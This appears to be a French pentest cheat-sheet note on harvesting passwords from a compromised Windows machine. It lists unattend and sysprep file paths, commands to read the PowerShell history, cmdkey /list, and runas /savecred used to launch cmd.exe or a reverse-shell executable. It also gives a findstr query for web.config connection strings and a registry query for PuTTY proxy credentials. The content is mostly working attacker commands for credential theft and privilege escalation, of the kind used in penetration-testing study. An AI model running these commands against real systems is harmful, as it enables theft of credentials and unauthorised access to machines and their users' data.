> Récolter des mots de passe à partir d'endroits habituels

Le moyen le plus simple d’accéder à un autre utilisateur consiste à collecter les informations d’identification d’une machine compromise.

## Unattended Windows Installations
Installations Windows sans surveillance
Dans ces fichiers, ont peut rencontrer des informations d'identification

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## Powershell History

Chaque fois qu'un utilisateur exécute une commande à l'aide de Powershell, elle est stockée dans un fichier qui conserve la mémoire des commandes passées.

```c
#cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```c
#powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Saved Windows Credentials 
Informations d'identification Windows enregistrées

Afficher les informations d'identification enregistrées :

```c
cmdkey /list
```

Bien qu'on ne peut pas voir les mots de passe réels, si vous remarquez des informations d'identification qui valent la peine d'être essayées `Type: Domaine Password`, vous pouvez les utiliser suivante :

```c
runas /savecred /user:{USERNAME_NAME} cmd.exe
```

```c
runas /savecred /user:{USERNAME_NAME} C:\Temp\rshel.exe
```

## IIS Configuration

Selon la version installée d'IIS, nous pouvons trouver web.config dans l'un des emplacements suivants :

```c
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Trouver les chaînes de connexion à la base de données sur le fichier :

```c
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY 
Récupérer les informations d'identification à partir du logiciel : PuTTY
Stock les configurations de proxy qui incluent les informations d'authentification en texte clair.

```c
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Utiliser aussi le [[Dumping Browsers Credentails]]

